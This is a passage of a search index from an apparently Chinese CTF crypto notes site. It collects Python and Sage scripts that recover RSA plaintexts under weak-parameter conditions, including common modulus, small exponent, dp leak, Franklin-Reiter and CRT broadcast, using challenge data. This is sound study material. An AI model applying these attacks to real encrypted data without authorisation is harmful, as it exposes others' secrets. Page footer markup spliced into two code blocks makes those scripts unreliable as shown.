%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#nec","title":"\u5df2\u77e5n\u3001e\u3001c\uff0c\u57fa\u7840\u89e3","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#necn","title":"\u5df2\u77e5n\u3001e\u3001c\uff0c\u4f46n\u4e0d\u80fd\u5206\u89e3","text":"<pre><code>m = sympy.nthroot_mod(c,e,n)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#necn_1","title":"\u5df2\u77e5n\u3001e\u3001c\uff0c\u4f46n\u4e0d\u662f\u6570\u5b57","text":"<pre><code>import gmpy2\nfrom base64 import b64decode\nfrom Crypto.Util.number import long_to_bytes\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\n\nc='GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA=='\ne=65537\nn=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443\np=3133337\nq=25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939\n\nc=b64decode(c)\nphi = (q-1) * (p-1)\nd = gmpy2.invert(e,phi)\n\nrsa_components=(n,e,int(d),p,q)\narsa=RSA.construct(rsa_components)\nrsakey = RSA.importKey(arsa.exportKey())\nrsakey = PKCS1_OAEP.new(rsakey) \ndecrypted = rsakey.decrypt(c)\nprint(decrypted)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#necephi","title":"\u5df2\u77e5n\u3001e\u3001c\uff0c\u4f46e\u4e0ephi\u4e0d\u4e92\u7d20","text":"<pre><code>import gmpy2\nfrom Crypto.Util.number import long_to_bytes \n\ne = 54722\nn = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121\nc = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319\np = 106021448991021391444550749375115277080844281746248845802565680557785009341952320484175568763707424932172033597514861602114171459176440279045761846695231788376075050452154924141266290931413542110639081792550648106240966552406813059396358355737185354885474455248579946190266152416149137616855791805617206153497\nq = 161136651053130509602530659420755324119806487925813087617466818245407407797561810253722204813002837916779909309520498985459703212021249251124954613236122142746302911323565396331355397916764254680629384957057354297855676493062493901977415968666512459829211010720514167083018352796496733697235524845188512914793\n\nphi = (q-1) * (p-1)\nd=gmpy2.invert(e//2,phi)\nm=gmpy2.powmod(c,int(d),n)\nm=gmpy2.iroot(m,2)[0]\nprint (long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#dpnecdp","title":"dp\u6cc4\u9732\uff0c\u5df2\u77e5n\u3001e\u3001c\u548cdp","text":"<pre><code>from Crypto.Util.number import *\nimport gmpy2\n\ne = 65537\nn = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847\nc = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869\ndp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825\n\n#\u5148\u7206\u7834K\u5f97\u5230p\u3001q\ntemp=dp*e\nfor i in range(1,e) :\n    if (temp-1)%i==0:\n        x=(temp-1)//i+1\n        y=n%x\n        if y==0:\n            p=x\n            break\nq = n // p\nassert isPrime(p)\nassert isPrime(q)\n#print(f\"p={p}\\nq={q}\")\n\nphi = (q-1) * (p-1)\nd = gmpy2.invert(e,phi)\n#print(d)\nm = pow(c,d,n)\nm = long_to_bytes(m)\nprint(m)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#pq","title":"pq\u76f8\u4f3c","text":"<pre><code>import gmpy2\nimport sympy\nfrom Crypto.Util.number import long_to_bytes\n\nn=177606504836499246970959030226871608885969321778211051080524634084516973331441644993898029573612290095853069264036530459253652875586267946877831055147546910227100566496658148381834683037366134553848011903251252726474047661274223137727688689535823533046778793131902143444408735610821167838717488859902242863683\ne = 65537\nc=1457390378511382354771000540945361168984775052693073641682375071407490851289703070905749525830483035988737117653971428424612332020925926617395558868160380601912498299922825914229510166957910451841730028919883807634489834128830801407228447221775264711349928156290102782374379406719292116047581560530382210049\n\nn2=gmpy2.iroot(n,2)[0]\np=sympy.nextprime(n2)\nq=n//p\nphi=(p-1)*(q-1)\nd=gmpy2.invert(e,phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#_1","title":"\u5171\u6a21\u653b\u51fb","text":"<pre><code>import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ne1 = 2767\ne2 = 3659\n\nn = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111\n\nc1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599\nc2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227\n\n_, r, s = gmpy2.gcdext(e1, e2)\n\nm = pow(c1, r, n) * pow(c2, s, n) % n\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#_2","title":"\u5c0f\u660e\u6587\u653b\u51fb","text":"<pre><code>import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ne = 0x10001\nf=open('rsa_16m.txt',\"r\")\nf.readline()\nc=int(f.readline().split(\"=\")[1],16)\nm = gmpy2.iroot(c,e)[0]\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#edcn","title":"\u5df2\u77e5e\u3001d\u3001c\uff0c\u4e0d\u77e5\u9053n","text":"<pre><code>from Crypto.Util.number import *\nfrom gmpy2 import *\n\ne = 0x10001\nd = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913\nc = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804\n\nkphi = e*d - 1\n\nfor k in range(1, e):\n    if kphi % k == 0:\n        phi = kphi // k\n        root = iroot(phi, 2)[0]\n        for p in range(root - 2000, root + 2000):\n            if phi % (p-1) == 0: break\n        else: continue\n        break\n\nq = phi//(p-1) + 1\nm = pow(c, d, p*q)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#nce","title":"\u5df2\u77e5n\u3001c\uff0c\u4e0d\u77e5\u9053e","text":"<pre><code>'''\nA=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x\np=next_prime(z*x*y)\nq=next_prime(z)\n'''\nA =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724\nn =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127\nc =  41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128\n\nimport sympy\nfrom gmpy2 import *\nfrom Crypto.Util.number import long_to_bytes\n\np = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569\nq = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183\nphi=(p-1)*(q-1)\n\ne=2\nstr1=\"RoarCTF{\"\nwhile(e&lt;100000):\n    e=next_prime(e)\n    try:\n        d=invert(e,phi)\n        m=pow(c,d,n)\n    except:\n        print (e)\n    else:\n        d=invert(e,phi)\n        m=pow(c,d,n)\n        str2=str(long_to_bytes(m))\n        if str1 in str2:\n            print(long_to_bytes(m))\n            break\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#cn","title":"\u53ea\u6709\u4e09\u7ec4c\u3001n","text":"<pre><code>from gmpy2 import *\nfrom Crypto.Util.number import *\nfrom functools import reduce\n\nN1 = int(str(331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004),5)\nc1 = int(str(310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243),5)\nN2 = int(str(302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114),5)\nc2 = int(str(112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344),5)\nN3 = int(str(332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323),5)\nc3 = int(str(10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242),5)\n\nN = [N1,N2,N3]\nc = [c1,c2,c3]\n\ndef chinese_remainder(modulus, remainders):\n    Sum = 0\n    prod = reduce(lambda a, b: a*b, modulus)\n    for m_i, r_i in zip(modulus, remainders):\n        p = prod // m_i\n        Sum += r_i * (inverse(p,m_i)*p)\n    return Sum % prod\ne = 3\n# print(chinese_remainder(N,c))\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 139 \u4e2a\u5b57 :fontawesome-solid-code: 269 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f\n&lt;/div&gt;\npow_m_e = chinese_remainder(N,c)\n# pow_m_e = 17446992834638639179129969961058029457462398677361658450137832328330435503838651797276948890990069700515669656391607670623897280684064423087023742140145529356863469816868212911716782075239982647322703714504545802436551322108638975695013439206776300941300053940942685511792851350404139366581130688518772175108412341696958930756520037\nm = iroot(pow_m_e,3)[0]\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#mcne","title":"\u53ea\u77e5\u9053\u4e09\u7ec4m\u3001c\uff0c\u4e0d\u77e5\u9053n\u3001e","text":"<pre><code>from Crypto.Util.number import *\nfrom gmpy2 import *\nfrom sympy import *\n#from secret import flag\n'''\np = getPrime(25)\ne = # Hidden\nq = getPrime(25)\nn = p * q\nm = bytes_to_long(flag.strip(b\"npuctf{\").strip(b\"}\"))\n\nc = pow(m, e, n)\nprint(c)\nprint(pow(2, e, n))\nprint(pow(4, e, n))\nprint(pow(8, e, n))\n\n'''\nc = 169169912654178\nc1 = 128509160179202\nc2 = 518818742414340\nc3 = 358553002064450\nm1 = 2\nm2 = 4\nm3 = 8\n\nn = gcd(pow(c1,2)-c2,c1*c2-c3)\n#1054494004042394&lt;16&gt; = 2 \u00b7 18195301 \u00b7 28977097\n\ne = discrete_log(n//2,c1,2)\n\np = 18195301\nq = 28977097\nphi = (q-1) * (p-1)\nd = invert(e,phi)\nm = pow(c,int(d),int(n//2))\n\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#cepq","title":"\u5df2\u77e5c\u3001e\u3001p\u3001q","text":"<p>\u4f46\u662f\uff0c\u7531\u4e8e\u4e0d\u4e92\u7d20\uff0c\u6240\u4ee5\u6309\u5e38\u89c4\u6c42\u4e0d\u51fad</p> <pre><code>from gmpy2 import *\nfrom Crypto.Util.number import *\nfrom tqdm import tqdm\ndef onemod(p,r):\n    t = p-2\n    while pow(t, (p-1) // r, p) == 1: t -= 1\n    return pow(t, (p-1) // r, p)\ndef solution(p,root): \n    g = onemod(p, 0x1337)\n    may = []\n    for i in range(0x1337):\n        if i % 100 == 0:\n            print(i)\n        may.append(root * pow(g,i,p) % p)\n    return may\nc = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359\np = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059\nq = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741\ne = 0x1337\nn = p * q\nc_p = pow(c, (1 + 3307 * (p - 1) // e) // e, p)\nC1 = solution(p, c_p)\nc_q = pow(c, (1 + (2649 * (q - 1) // e)) // e, q)\nC2 = solution(q, c_q)\na = invert(p, q)\nb = invert(q, p)\nflag=0\nfor i in tqdm(C1):\n    for j in tqdm(C2):\n        flag += 1\n        if flag % 1000000 == 0:\n            print(flag)\n        x = (b * q * i + a * p * j) % n\n        if b\"NCTF{\" in long_to_bytes(x):\n            print(long_to_bytes(x))\n            exit()\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/","title":"P19.Franklin-Reiter\u653b\u51fb\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#p19sage-franklin-reiter","title":"P19.sage Franklin-Reiter\u653b\u51fb\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#_1","title":"\u7f51\u4e0a\u811a\u672c","text":"<p>https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/FranklinReiter.sage <pre><code>#sage\n\n# Franklin-Reiter \u653b\u51fb RSA\u3002\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 42 \u4e2a\u5b57 :fontawesome-solid-code: 211 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f\n&lt;/div&gt;\n# \u5982\u679c\u4e24\u6761\u6d88\u606f\u7684\u533a\u522b\u4ec5\u5728\u4e8e\u4e24\u6761\u6d88\u606f\u4e4b\u95f4\u7684\u5df2\u77e5\u56fa\u5b9a\u5dee\u5f02\n# \u5e76\u4e14\u662f\u5728\u76f8\u540c\u7684 RSA \u6a21\u6570 N \u4e0b\u8fdb\u884c RSA \u52a0\u5bc6\u7684\n# \u90a3\u4e48\u5c31\u53ef\u4ee5\u6062\u590d\u5b83\u4eec\u3002\n\n# \u8f93\u5165\u662f\u6a21\u6570\uff0c\u5df2\u77e5\u5dee\u5f02\uff0c\u5bc6\u65871\uff0c\u5bc6\u65872\u3002\n# Ciphertext 1 \u5bf9\u5e94\u4e24\u4e2a\u660e\u6587\u4e2d\u8f83\u5c0f\u7684\u4e00\u4e2a\u3002\uff08\u6ca1\u6709\u6dfb\u52a0\u56fa\u5b9a\u5dee\u5f02\u7684\u90a3\u4e2a\uff09\ndef franklinReiter(n,e,r,c1,c2):\n    R.&lt;X&gt; = Zmod(n)[]\n    f1 = X^e - c1\n    f2 = (X + r)^e - c2\n    # coefficient 0 = -m, which is what we wanted!\n    return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0])\n\n  # GCD is not implemented for rings over composite modulus in Sage\n  # so we do our own implementation. Its the exact same as standard GCD, but with\n  # the polynomials monic representation\ndef compositeModulusGCD(a, b):\n    if(b == 0):\n        return a.monic()\n    else:\n        return compositeModulusGCD(b, a % b)\n\ndef CoppersmithShortPadAttack(e,n,C1,C2,eps=1/30):\n    \"\"\"\n    Coppersmith's Shortpad attack!\n    Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack\n    \"\"\"\n    import binascii\n    P.&lt;x,y&gt; = PolynomialRing(ZZ)\n    ZmodN = Zmod(n)\n    g1 = x^e - C1\n    g2 = (x+y)^e - C2\n    res = g1.resultant(g2)\n    P.&lt;y&gt; = PolynomialRing(ZmodN)\n    # Convert Multivariate Polynomial Ring to Univariate Polynomial Ring\n    rres = 0\n    for i in range(len(res.coefficients())):\n        rres += res.coefficients()[i]*(y^(res.exponents()[i][1]))\n\n    diff = rres.small_roots(epsilon=eps)\n    recoveredM1 = franklinReiter(n,e,diff[0],C1,C2)\n    print(recoveredM1)\n    print(\"Message is the following hex, but potentially missing some zeroes in the binary from the right end\")\n    print(hex(recoveredM1))\n    print(\"Message is one of:\")\n    for i in range(8):\n        msg = hex(Integer(recoveredM1*pow(2,i)))\n        if(len(msg)%2 == 1):\n            msg = '0' + msg\n        if(msg[:2]=='0x'):\n            msg = msg[:2]\n        print(binascii.unhexlify(msg))\n\ndef testCoppersmithShortPadAttack(eps=1/25):\n    from Crypto.PublicKey import RSA\n    import random\n    import math\n    import binascii\n    M = \"flag{This_Msg_Is_2_1337}\"\n    M = int(binascii.hexlify(M),16)\n    e = 3\n    nBitSize =  8192\n    key = RSA.generate(nBitSize)\n    #Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever\n    m = int(math.floor(nBitSize/(e*e))) - 400\n    assert (m &lt; nBitSize - len(bin(M)[2:]))\n    r1 = random.randint(1,pow(2,m))\n    r2 = random.randint(r1,pow(2,m))\n    M1 = pow(2,m)*M + r1\n    M2 = pow(2,m)*M + r2\n    C1 = Integer(pow(M1,e,key.n))\n    C2 = Integer(pow(M2,e,key.n))\n    CoppersmithShortPadAttack(e,key.n,C1,C2,eps)\n\ndef testFranklinReiter():\n    p = random_prime(2^512)\n    q = random_prime(2^512)\n    n = p * q # 1024-bit modulus\n    e = 11\n\n    m = randint(0, n) # some message we want to recover\n    r = randint(0, n) # random padding\n\n    c1 = pow(m + 0, e, n)\n    c2 = pow(m + r, e, n)\n    print(m)\n    recoveredM = franklinReiter(n,e,r,c1,c2)\n    print(recoveredM)\n    assert recoveredM==m\n    print(\"They are equal!\")\n    return True\n</code></pre></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#1","title":"\u9898\u76ee1","text":"<pre><code>from Crypto.Util.number import *\nfrom random import choice\nimport string\nfrom flag import flag\n\ndef getIv(length,chars=string.ascii_lowercase):\n    return ''.join([choice(chars) for i in range(length)])\n\np = getPrime(1024)\nq = getPrime(1024)\niv = getIv(128)\n\nkey1 = bytes_to_long(flag+iv)\nkey2 = bytes_to_long(iv)\n\ne = 3\nprint 'n:' + str(p*q)\nc1 = pow(key1,e,p*q)\nc2 = pow(key2,e,p*q)\n\nprint 'c1:' + str(c1)\nprint 'c2:' + str(c2)\n\nx = key1/key2\ny = key1-x*key2\nkey1=x*key2+y\n\n\nprint 'x:' + str(x)\nprint 'y:' + str(y)\n\n# output:\nn=18099247369280154886617000375109767499806054172740063389012130770186820932961360864498732850525922466534945118800932145228805671351976586517097622365680011651402327925464073182713293531130034756251505774357417055627671229271867926990490595666312835905910514734764729504786992310448996071206128488211439271233843142630939565246707372296583601804184804171689260854956262942235631405717696974169377626396323676395636456740120025184398476594314662368359312356066266921270189494622506635066969735080655725839847984616974215284857408784397344862523720171616739915198953492024993048307867785945156942213152962536432345964739\nc1=12278575945470897872640453814770538959516698979717179227690510266529921428552864312660132740788416401327102285180588038083079258311881620201133998229854752124927460819177711379328404288010908880844043596472423294384267295041524633599162192148584399505960857935034928148929492625945646997837039619205559476017169925713468855198646629226970777687397537720214045661626920833445827989359857671018875074072055022703115700566419215341376615131689314020746375076743801434662693872661942545103307966098491064656551141436523806773529181866000500420523710554658948977262516303583655752676734847641890080943847492535926834052488\nc2=17408296326028739312453312633484317596943826388625453121732287745283275892186527757287755028016444735036842917880385034442965065523813174163945799579491327454221196284056233455567244848717704030947162883942273297422509937269431814260733969129102074843485655311252111459010777945499431139524012532947251982056639653098247711079544046418704543343537501388589717979520036378098389654456014224822916973106504500942515154126504282811270117380780048894037581126326329800132358724785374395728605324605424194037625702457971360093340866984155213328508506733775129948622882145937096019437059787874064306250117133787681357927186\nx=94819009910611490937147710332193973830402125343380796\ny=27036298270176650012154148050982037588069778308019261952420224460786523779956477136773576099293451667012578253132502506974471829679519804802324747292357969625762476160905899712303273534268489228000459887114964986912314483751635173113737622875478746013228230937327043213246022641974495178269021953810671692021\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#_2","title":"\u89e3\u5bc6\u811a\u672c","text":"<p>\